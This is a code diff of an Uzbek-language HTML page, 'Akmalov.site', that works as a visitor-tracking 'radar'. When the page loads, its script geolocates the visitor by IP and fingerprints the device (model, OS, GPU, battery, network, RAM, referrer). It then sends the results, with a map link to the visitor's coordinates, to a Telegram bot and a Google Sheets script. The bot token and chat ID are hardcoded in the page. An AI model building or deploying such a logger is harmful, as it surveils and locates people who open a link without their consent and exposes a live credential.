@@ -9,10 +9,10 @@
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
     }
     body {
-      background: linear-gradient(135deg, #0f172a, #1e293b);
+      background: radial-gradient(circle at top, #1e293b, #0f172a);
       color: #f8fafc;
       min-height: 100vh;
       display: flex;
@@ -22,130 +22,236 @@
     }
     .card {
       background: rgba(255, 255, 255, 0.05);
-      backdrop-filter: blur(12px);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
       border: 1px solid rgba(255, 255, 255, 0.12);
-      border-radius: 20px;
-      padding: 32px;
-      max-width: 460px;
+      border-radius: 24px;
+      padding: 32px 26px;
+      max-width: 480px;
       width: 100%;
       text-align: center;
-      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
+      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.5);
     }
-    h1 {
-      font-size: 28px;
-      margin-bottom: 8px;
-      background: linear-gradient(90deg, #38bdf8, #818cf8);
+    .logo {
+      font-size: 30px;
+      font-weight: 800;
+      margin-bottom: 6px;
+      background: linear-gradient(90deg, #38bdf8, #818cf8, #c084fc);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
     }
-    p.subtitle {
+    .subtitle {
       color: #94a3b8;
       font-size: 14px;
       margin-bottom: 24px;
     }
-    .stats-box {
-      background: rgba(15, 23, 42, 0.6);
-      border-radius: 14px;
-      padding: 16px;
-      margin-bottom: 16px;
+    .info-list {
+      background: rgba(15, 23, 42, 0.65);
+      border: 1px solid rgba(255, 255, 255, 0.07);
+      border-radius: 16px;
+      padding: 16px 18px;
       text-align: left;
       font-size: 14px;
-      line-height: 1.8;
-      border: 1px solid rgba(255, 255, 255, 0.06);
+      margin-bottom: 20px;
     }
-    .stats-box div {
+    .info-row {
       display: flex;
       justify-content: space-between;
+      align-items: center;
+      padding: 8px 0;
       border-bottom: 1px dashed rgba(255, 255, 255, 0.08);
-      padding: 4px 0;
+      gap: 12px;
     }
-    .stats-box div:last-child {
+    .info-row:last-child {
       border-bottom: none;
     }
     .label {
       color: #94a3b8;
+      white-space: nowrap;
     }
-    .value {
-      color: #e2e8f0;
+    .val {
+      color: #f1f5f9;
       font-weight: 600;
+      text-align: right;
+      word-break: break-word;
     }
-    .counter-badge {
-      display: inline-block;
-      margin-top: 10px;
-      padding: 10px 22px;
-      background: rgba(56, 189, 248, 0.15);
-      border: 1px solid rgba(56, 189, 248, 0.4);
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 24px;
+      background: rgba(56, 189, 248, 0.14);
+      border: 1px solid rgba(56, 189, 248, 0.35);
       border-radius: 999px;
       color: #38bdf8;
-      font-weight: 600;
+      font-weight: 700;
       font-size: 15px;
     }
-    .status-dot {
-      font-size: 12px;
-      color: #64748b;
+    .status {
       margin-top: 14px;
+      font-size: 12.5px;
+      color: #64748b;
     }
   </style>
 </head>
 <body>
 
   <div class="card">
-    <h1>Akmalov.site</h1>
-    <p class="subtitle">Xush kelibsiz! Saytimizga tashrifingiz qayd etildi.</p>
+    <div class="logo">Akmalov.site</div>
+    <p class="subtitle">Xush kelibsiz! Tashrifingiz avtomatik ro'yxatga olindi.</p>
 
-    <div class="stats-box">
-      <div><span class="label">🌐 IP Manzil:</span> <span class="value" id="ui-ip">Aniqlanmoqda...</span></div>
-      <div><span class="label">📍 Manzil:</span> <span class="value" id="ui-loc">Aniqlanmoqda...</span></div>
-      <div><span class="label">📡 Provayder:</span> <span class="value" id="ui-isp">Aniqlanmoqda...</span></div>
-      <div><span class="label">🖥 Ekran / RAM:</span> <span class="value" id="ui-screen">Aniqlanmoqda...</span></div>
+    <div class="info-list">
+      <div class="info-row">
+        <span class="label">🌐 IP Manzil:</span>
+        <span class="val" id="ui-ip">Aniqlanmoqda...</span>
+      </div>
+      <div class="info-row">
+        <span class="label">📍 Joylashuv:</span>
+        <span class="val" id="ui-loc">Aniqlanmoqda...</span>
+      </div>
+      <div class="info-row">
+        <span class="label">📡 Provayder:</span>
+        <span class="val" id="ui-isp">Aniqlanmoqda...</span>
+      </div>
+      <div class="info-row">
+        <span class="label">📱 Qurilma:</span>
+        <span class="val" id="ui-dev">Aniqlanmoqda...</span>
+      </div>
+      <div class="info-row">
+        <span class="label">🖥 Ekran / Xotira:</span>
+        <span class="val" id="ui-hw">Aniqlanmoqda...</span>
+      </div>
+      <div class="info-row">
+        <span class="label">🔋 Quvvat / Tarmoq:</span>
+        <span class="val" id="ui-bat">Aniqlanmoqda...</span>
+      </div>
     </div>
 
-    <div class="counter-badge">
-      👁 Jami tashriflar: <span id="visit-count">...</span>
+    <div class="badge">
+      👁 Sizning tashrifingiz: #<span id="visit-count">1</span>
     </div>
 
-    <p class="status-dot" id="send-status">⏳ Ma'lumot yuborilmoqda...</p>
+    <div class="status" id="ui-status">⏳ Radar ishga tushirilmoqda...</div>
   </div>
 
-  <!-- ========================================== -->
-  <!-- GEO + TELEGRAM + GOOGLE SHEETS TRACKER KODI -->
-  <!-- ========================================== -->
   <script>
-  async function trackVisitor() {
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycby9az55tRrGzbNlQj1SsVdeHEhMhQwbbZmQjdU3EzKTpvlmuonrg2Rt1Lfz_uuLEVw/exec";
+  // ==========================================================
+  // BARCHA SOZLAMALAR SHU YERDA (100% TAYYOR ULANGAN)
+  // ==========================================================
+  const TELEGRAM_BOT_TOKEN = "8055194595:AAG4QC_OGS1yrSxnZDuF0MHTxtTd7ZMCn68";
+  const TELEGRAM_CHAT_ID = "8781718740";
+  const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycby9az55tRrGzbNlQj1SsVdeHEhMhQwbbZmQjdU3EzKTpvlmuonrg2Rt1Lfz_uuLEVw/exec";
+
+  // 1. Qurilma modeli, OS va Brauzerni aniq ajratib oluvchi funksiya
+  function getDetailedDevice(ua) {
+    let os = "Noma'lum OS";
+    let browser = "Noma'lum Brauzer";
+    let type = "Kompyuter 💻";
+    let model = "PC / Noutbuk";
+
+    if (/Android/i.test(ua)) {
+      const mOs = ua.match(/Android\s([0-9.]+)/i);
+      os = "Android" + (mOs ? " " + mOs[1] : "");
+      type = "Smartfon 📱";
+      const mModel = ua.match(/;\s*([^;)]+?)\s+Build\//i) || ua.match(/Android\s[0-9.]+;\s*([^;)]+)/i);
+      if (mModel && mModel[1]) {
+        let raw = mModel[1].trim();
+        if (/SM-/i.test(raw)) model = "Samsung (" + raw + ")";
+        else if (/Redmi|Mi |POCO|22|23|24/i.test(raw)) model = "Xiaomi/Redmi (" + raw + ")";
+        else if (/RMX/i.test(raw)) model = "Realme (" + raw + ")";
+        else if (/CPH/i.test(raw)) model = "OPPO (" + raw + ")";
+        else model = raw;
+      } else {
+        model = "Android Smartfon";
+      }
+    } else if (/iPhone|iPad|iPod/i.test(ua)) {
+      const mIos = ua.match(/OS\s([0-9_]+)/i);
+      os = "iOS" + (mIos ? " " + mIos[1].replace(/_/g, ".") : "");
+      type = /iPad/i.test(ua) ? "Planshet 📱" : "Smartfon 📱";
+      model = /iPad/i.test(ua) ? "Apple iPad" : "Apple iPhone";
+    } else if (/Windows NT 10.0/i.test(ua)) {
+      os = "Windows 10/11";
+    } else if (/Windows/i.test(ua)) {
+      os = "Windows";
+    } else if (/Macintosh|Mac OS X/i.test(ua)) {
+      os = "macOS";
+      model = "Apple MacBook / Mac";
+    } else if (/Linux/i.test(ua)) {
+      os = "Linux";
+    }
+
+    if (/Telegram/i.test(ua)) browser = "Telegram Brauzeri ✈️";
+    else if (/Instagram/i.test(ua)) browser = "Instagram Brauzeri 📸";
+    else if (/SamsungBrowser/i.test(ua)) browser = "Samsung Internet";
+    else if (/YaBrowser/i.test(ua)) browser = "Yandex Browser";
+    else if (/Edg/i.test(ua)) browser = "Microsoft Edge";
+    else if (/OPR|Opera/i.test(ua)) browser = "Opera";
+    else if (/Chrome/i.test(ua)) browser = "Google Chrome";
+    else if (/Safari/i.test(ua)) browser = "Apple Safari";
+    else if (/Firefox/i.test(ua)) browser = "Mozilla Firefox";
+
+    return { os, browser, type, model };
+  }
+
+  // 2. Videokarta (GPU) chipini aniqlash (iPhone/Android/PC modelini yanada aniqlashtiradi)
+  function getGPUInfo() {
+    try {
+      const canvas = document.createElement("canvas");
+      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+      if (!gl) return "Aniqlanmadi";
+      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+      if (debugInfo) {
+        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      }
+    } catch (e) {}
+    return "Standart GPU";
+  }
+
+  function escapeHtml(str) {
+    return String(str || "")
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;");
+  }
+
+  async function runFullTracker() {
+    const statusEl = document.getElementById("ui-status");
 
     let geo = {
       ip: "Noma'lum",
       country: "Noma'lum",
       city: "Noma'lum",
+      region: "",
       isp: "Noma'lum",
       lat: "",
       lon: ""
     };
 
-    // 1-urinish: ipwho.is (Tez va bloklanmaydi)
+    // 1-Server: ipwho.is
     try {
-      const res1 = await fetch("https://ipwho.is/");
-      const d1 = await res1.json();
+      const r1 = await fetch("https://ipwho.is/");
+      const d1 = await r1.json();
       if (d1 && d1.success) {
         geo.ip = d1.ip;
-        geo.country = d1.country;
-        geo.city = d1.city;
+        geo.country = d1.country || "Noma'lum";
+        geo.city = d1.city || "Noma'lum";
+        geo.region = d1.region || "";
         geo.isp = (d1.connection && (d1.connection.isp || d1.connection.org)) || "Noma'lum";
         geo.lat = d1.latitude || "";
         geo.lon = d1.longitude || "";
       }
     } catch (e) {}
 
-    // 2-urinish (Zaxira): ipapi.co
+    // 2-Server (Zaxira): ipapi.co
     if (geo.ip === "Noma'lum") {
       try {
-        const res2 = await fetch("https://ipapi.co/json/");
-        const d2 = await res2.json();
+        const r2 = await fetch("https://ipapi.co/json/");
+        const d2 = await r2.json();
         if (d2 && d2.ip) {
           geo.ip = d2.ip;
           geo.country = d2.country_name || "Noma'lum";
           geo.city = d2.city || "Noma'lum";
+          geo.region = d2.region || "";
           geo.isp = d2.org || "Noma'lum";
           geo.lat = d2.latitude || "";
           geo.lon = d2.longitude || "";
@@ -153,95 +259,166 @@
       } catch (e) {}
     }
 
-    // 3-urinish (Zaxira): ipify
+    // 3-Server (Zaxira): freeipapi.com
     if (geo.ip === "Noma'lum") {
       try {
-        const res3 = await fetch("https://api.ipify.org?format=json");
-        const d3 = await res3.json();
-        if (d3 && d3.ip) geo.ip = d3.ip;
+        const r3 = await fetch("https://freeipapi.com/api/json");
+        const d3 = await r3.json();
+        if (d3 && d3.ipAddress) {
+          geo.ip = d3.ipAddress;
+          geo.country = d3.countryName || "Noma'lum";
+          geo.city = d3.cityName || "Noma'lum";
+          geo.region = d3.regionName || "";
+          geo.lat = d3.latitude || "";
+          geo.lon = d3.longitude || "";
+        }
       } catch (e) {}
     }
 
-    // Batareya foizi va Tarmoq turi (4G / Wi-Fi)
-    let batteryInfo = "Yopiq (iOS/Safari)";
+    // Batareya foizi va Zaryad holati
+    let batteryText = "Yopiq (iOS/Safari)";
     try {
       if (navigator.getBattery) {
         const bat = await navigator.getBattery();
-        batteryInfo = Math.round(bat.level * 100) + "%" + (bat.charging ? " ⚡️ (Zaryadda)" : "");
+        batteryText = Math.round(bat.level * 100) + "%" + (bat.charging ? " ⚡️ (Zaryadda)" : "");
       }
     } catch (e) {}
 
+    // Internet tarmog'i turi va tezligi
     const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    if (conn && conn.effectiveType) {
-      batteryInfo += ` | 📶 ${conn.effectiveType.toUpperCase()}`;
+    if (conn) {
+      let netParts = [];
+      if (conn.effectiveType) netParts.push(conn.effectiveType.toUpperCase());
+      if (conn.downlink) netParts.push(conn.downlink + " Mbps");
+      if (netParts.length > 0) batteryText += " | 📶 " + netParts.join(" ");
     }
 
-    // Ekran o'lchami + Xotira (RAM) va Protsessor yadrosi
-    let screenInfo = `${window.screen.width}x${window.screen.height}`;
-    let hwDetails = [];
-    if (navigator.deviceMemory) hwDetails.push(`${navigator.deviceMemory}GB RAM`);
-    if (navigator.hardwareConcurrency) hwDetails.push(`${navigator.hardwareConcurrency} yadro`);
-    if (hwDetails.length > 0) {
-      screenInfo += ` (${hwDetails.join(", ")})`;
-    }
+    // Ekran, RAM va CPU yadrolari
+    let hwText = `${window.screen.width}x${window.screen.height}`;
+    let specs = [];
+    if (navigator.deviceMemory) specs.push(`${navigator.deviceMemory}GB RAM`);
+    if (navigator.hardwareConcurrency) specs.push(`${navigator.hardwareConcurrency} yadro`);
+    if (specs.length > 0) hwText += ` (${specs.join(", ")})`;
 
-    // Qayerdan kelganligini aniqlash (Referrer / UTM)
+    const dev = getDetailedDevice(navigator.userAgent);
+    const gpu = getGPUInfo();
+
+    // Nechanchi marta kirayotganini hisoblash
+    let visits = parseInt(localStorage.getItem("akmalov_visit_num") || "0", 10) + 1;
+    localStorage.setItem("akmalov_visit_num", visits);
+    const statusBadge = visits === 1 ? "🆕 Yangi foydalanuvchi (1-marta)" : `🔄 Qayta tashrif (${visits}-marta)`;
+
+    // Qayerdan keldi (Referrer / UTM)
     const urlParams = new URLSearchParams(window.location.search);
-    const utmSource = urlParams.get("utm_source") || urlParams.get("from") || urlParams.get("ref") || "";
-    let referrerSource = document.referrer || "To'g'ridan-to'g'ri (Direct)";
-    if (utmSource) {
-      referrerSource = "Maxsus ssilka (" + utmSource + ")";
-    } else if (/Telegram/i.test(navigator.userAgent)) {
-      referrerSource = "Telegram ilovasi ✈️";
-    } else if (/Instagram/i.test(navigator.userAgent)) {
-      referrerSource = "Instagram ilovasi 📸";
+    const utm = urlParams.get("utm_source") || urlParams.get("from") || urlParams.get("ref") || "";
+    let refSource = document.referrer || "To'g'ridan-to'g'ri (Direct)";
+    if (utm) refSource = `Maxsus ssilka (${utm})`;
+    else if (/Telegram/i.test(navigator.userAgent)) refSource = "Telegram ilovasi ✈️";
+    else if (/Instagram/i.test(navigator.userAgent)) refSource = "Instagram ilovasi 📸";
+
+    const timeNow = new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent" });
+    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Asia/Tashkent";
+    const pageUrl = window.location.pathname + window.location.search;
+
+    // Ekrandagi jadvalni to'ldirish
+    document.getElementById("ui-ip").textContent = geo.ip;
+    document.getElementById("ui-loc").textContent = `${geo.country}, ${geo.city}`;
+    document.getElementById("ui-isp").textContent = geo.isp;
+    document.getElementById("ui-dev").textContent = `${dev.model} (${dev.os})`;
+    document.getElementById("ui-hw").textContent = hwText;
+    document.getElementById("ui-bat").textContent = batteryText;
+    document.getElementById("visit-count").textContent = visits;
+
+    // Google Maps ssilkasi
+    const mapLink = (geo.lat && geo.lon)
+      ? ` <a href="https://www.google.com/maps?q=${geo.lat},${geo.lon}">[🗺 Xaritada ochish]</a>`
+      : "";
+
+    // Telegramga boradigan mukammal xabar
+    const tgMessage =
+      `🚨 <b>Akmalov.site — Tashrif Radari!</b>\n` +
+      `━━━━━━━━━━━━━━━━━━\n` +
+      `👤 <b>Holati:</b> ${escapeHtml(statusBadge)}\n` +
+      `🌐 <b>IP Manzil:</b> <code>${escapeHtml(geo.ip)}</code>\n` +
+      `📍 <b>Joylashuv:</b> ${escapeHtml(geo.country + ", " + geo.city + (geo.region ? " (" + geo.region + ")" : ""))}${mapLink}\n` +
+      `📡 <b>Provayder:</b> ${escapeHtml(geo.isp)}\n` +
+      `━━━━━━━━━━━━━━━━━━\n` +
+      `📱 <b>Qurilma:</b> ${escapeHtml(dev.type + " — " + dev.model)}\n` +
+      `⚙️ <b>Tizim va Brauzer:</b> ${escapeHtml(dev.os + " | " + dev.browser)}\n` +
+      `🎮 <b>Grafik chip (GPU):</b> <code>${escapeHtml(gpu)}</code>\n` +
+      `🖥 <b>Ekran va Xotira:</b> ${escapeHtml(hwText)}\n` +
+      `🔋 <b>Quvvat va Tarmoq:</b> ${escapeHtml(batteryText)}\n` +
+      `🌍 <b>Til va Vaqt mintaqasi:</b> ${escapeHtml((navigator.language || "uz") + " | " + timeZone)}\n` +
+      `🔗 <b>Qayerdan keldi:</b> ${escapeHtml(refSource)}\n` +
+      `📄 <b>Sahifa:</b> <code>${escapeHtml(pageUrl)}</code>\n` +
+      `🕒 <b>Vaqt:</b> ${escapeHtml(timeNow)}`;
+
+    // 1-QADAM: TO'G'RIDAN-TO'G'RI TELEGRAMGA YUBORISH (100% KAFOLAT)
+    let sentOk = false;
+    try {
+      const tgResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: tgMessage,
+          parse_mode: "HTML",
+          disable_web_page_preview: true
+        })
+      });
+      const tgResult = await tgResponse.json();
+      if (tgResult && tgResult.ok) {
+        sentOk = true;
+        statusEl.textContent = "✅ Ma'lumotlar Telegramga muvaffaqiyatli yuborildi!";
+        statusEl.style.color = "#4ade80";
+      }
+    } catch (e) {}
+
+    // Agar POST bloklansa, GET orqali Telegramga zaxira yuborish
+    if (!sentOk) {
+      try {
+        const tgParams = new URLSearchParams({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: tgMessage,
+          parse_mode: "HTML",
+          disable_web_page_preview: "true"
+        });
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?${tgParams.toString()}`, { mode: "no-cors" });
+        statusEl.textContent = "✅ Ma'lumotlar zaxira kanali orqali Telegramga yuborildi!";
+        statusEl.style.color = "#4ade80";
+      } catch (err) {
+        statusEl.textContent = "⚠️ Xatolik: Internet aloqasini tekshiring.";
+      }
     }
 
-    // Ekrandagi UI elementlarni to'ldirish (agar sahifada bor bo'lsa)
-    const elIp = document.getElementById("ui-ip");
-    const elLoc = document.getElementById("ui-loc");
-    const elIsp = document.getElementById("ui-isp");
-    const elScreen = document.getElementById("ui-screen");
-    const elStatus = document.getElementById("send-status");
-
-    if (elIp) elIp.textContent = geo.ip;
-    if (elLoc) elLoc.textContent = `${geo.country}, ${geo.city}`;
-    if (elIsp) elIsp.textContent = geo.isp;
-    if (elScreen) elScreen.textContent = screenInfo;
-
-    // Google Apps Script uchun URL parametrlar
-    const params = new URLSearchParams({
-      ip: geo.ip,
-      country: geo.country,
-      city: geo.city,
-      isp: geo.isp,
-      lat: geo.lat,
-      lon: geo.lon,
-      userAgent: navigator.userAgent,
-      screen: screenInfo,
-      language: navigator.language || "Noma'lum",
-      battery: batteryInfo,
-      referrer: referrerSource,
-      page: window.location.pathname + window.location.search
-    });
-
-    try {
-      const response = await fetch(`${SCRIPT_URL}?${params.toString()}`);
-      const result = await response.json();
-
-      const counterEl = document.getElementById("visit-count") || document.getElementById("visits");
-      if (counterEl && result.visits) {
-        counterEl.textContent = result.visits;
-      }
-      if (elStatus) elStatus.textContent = "✅ Statistikaga muvaffaqiyatli yozildi!";
-    } catch (err) {
-      // Agar CORS cheklovi bo'lsa ham, no-cors orqali Telegramga 100% yetkazadi
-      fetch(`${SCRIPT_URL}?${params.toString()}`, { mode: "no-cors" });
-      if (elStatus) elStatus.textContent = "✅ Telegramga yuborildi!";
+    // 2-QADAM: ORQA FONDA GOOGLE SHEETS JADVALIGA HAM YOZISH
+    if (GOOGLE_SCRIPT_URL) {
+      try {
+        const sheetPayload = {
+          ip: geo.ip,
+          country: geo.country,
+          city: geo.city,
+          region: geo.region,
+          isp: geo.isp,
+          lat: geo.lat,
+          lon: geo.lon,
+          userAgent: `${dev.model} | ${dev.os} | ${dev.browser} | GPU: ${gpu}`,
+          screen: hwText,
+          battery: batteryText,
+          language: navigator.language || "uz",
+          referrer: refSource,
+          page: pageUrl
+        };
+        fetch(GOOGLE_SCRIPT_URL, {
+          method: "POST",
+          mode: "no-cors",
+          body: JSON.stringify(sheetPayload)
+        });
+      } catch (e) {}
     }
   }
 
-  window.addEventListener("DOMContentLoaded", trackVisitor);
+  window.addEventListener("DOMContentLoaded", runFullTracker);
   </script>
 
 </body>
